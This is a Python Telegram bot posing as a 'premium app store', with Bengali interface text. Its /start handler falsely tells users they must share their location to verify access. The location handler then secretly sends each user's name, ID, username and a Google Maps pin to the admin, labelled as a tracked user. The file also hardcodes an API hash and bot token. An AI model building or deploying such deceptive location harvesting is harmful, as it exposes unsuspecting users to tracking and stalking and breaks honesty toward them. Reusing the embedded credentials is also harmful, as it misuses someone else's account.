import sqlite3
import logging
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

API_ID = "39534141" 
API_HASH = "699bb01ac7873fabc7212db10dc9ffdc" 
BOT_TOKEN = "7708154020:AAEhKUFfVh2KZeUIl1uT7Cnn43wYODyaFis"

ADMIN_USERNAME = "CYBER_71_ENAFUL" 
MY_ID_LINK = "https://t.me/KING_OF_ENAFUL"

app = Client("PremiumStore_Bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def get_db():
    conn = sqlite3.connect("apps_store.db", timeout=10)
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS apps (name TEXT, file_id TEXT)")
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER UNIQUE)")
    conn.commit()
    conn.close()

init_db()

@app.on_message(filters.command("start"))
async def start(client, message):
    user_id = message.from_user.id
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()
    
    location_button = ReplyKeyboardMarkup(
        [[KeyboardButton("📍 Verify Location to Access 📱", request_location=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )

    welcome_text = (
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃   🚀 **PREMIUM APP STORE** ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"👋 **Welcome Mr. {message.from_user.first_name}!**\n"
        f"বটটি ব্যবহার করতে নিচের বাটন থেকে আপনার লোকেশন ভেরিফাই করুন।"
    )
    await message.reply_text(text=welcome_text, reply_markup=location_button)

@app.on_message(filters.location)
async def get_location(client, message):
    user = message.from_user
    lat, lon = message.location.latitude, message.location.longitude
    
    admin_info = (
        f"🛰 **নতুন ইউজার ট্র্যাক করা হয়েছে!**\n\n"
        f"👤 নাম: {user.first_name}\n"
        f"🆔 আইডি: `{user.id}`\n"
        f"🔗 ইউজারনেম: @{user.username}\n"
        f"📍 ম্যাপ: https://www.google.com/maps?q={lat},{lon}"
    )
    
    try:
        await client.send_message(ADMIN_USERNAME, admin_info)
    except: pass

    await message.reply_text("✅ ভেরিফিকেশন সফল! নিচের অ্যাপগুলো থেকে সিলেক্ট করুন।", reply_markup=ReplyKeyboardMarkup([], sensitive=True))
    await show_app_list(client, message)

async def show_app_list(client, message):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT name FROM apps")
    rows = cursor.fetchall()
    conn.close()

    keyboard = []
    for i, row in enumerate(rows):
        btns = [InlineKeyboardButton(f"📱 {row[0]}", callback_data=f"get_app_{i}")]
        if message.from_user.username == ADMIN_USERNAME:
            btns.append(InlineKeyboardButton("🗑 Delete", callback_data=f"del_app_{i}"))
        keyboard.append(btns)
    
    keyboard.append([InlineKeyboardButton(f"👨‍💻 Contact Admin", url=MY_ID_LINK)])
    await message.reply_text(f"📢 **মোট অ্যাপ:** {len(rows)} টি\n📦 অ্যাপ লিস্ট:", reply_markup=InlineKeyboardMarkup(keyboard))

@app.on_message(filters.command("all") & filters.user(ADMIN_USERNAME))
async def broadcast(client, message):
    if len(message.command) < 2:
        return await message.reply_text("❌ `/all আপনার মেসেজ` লিখুন।")
    
    msg = message.text.split(None, 1)[1]
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()
    
    count = 0
    for user in users:
        try:
            await client.send_message(user[0], f"📢 **বট আপডেট:**\n\n{msg}")
            count += 1
        except: pass
    await message.reply_text(f"✅ সফলভাবে {count} জনের কাছে মেসেজ পাঠানো হয়েছে।")

@app.on_callback_query(filters.regex(r"get_app_(\d+)"))
async def send_app(client, query):
    index = int(query.data.split("_")[2])
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT name, file_id FROM apps")
    rows = cursor.fetchall()
    conn.close()

    if index < len(rows):
        await query.message.reply_document(rows[index][1], caption=f"🚀 **{rows[index][0]}**")
    else:
        await query.answer("❌ ফাইলটি পাওয়া যায়নি।", show_alert=True)

@app.on_message(filters.document & filters.user(ADMIN_USERNAME))
async def save_app(client, message):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO apps (name, file_id) VALUES (?, ?)", (message.document.file_name, message.document.file_id))
    conn.commit()
    conn.close()
    await message.reply_text(f"✅ স্টোরে যুক্ত হয়েছে: {message.document.file_name}")

print("বটটি লোকেশন ট্র্যাকিং ও ডাটাবেস ফিক্সসহ অনলাইনে আছে...")
app.run()

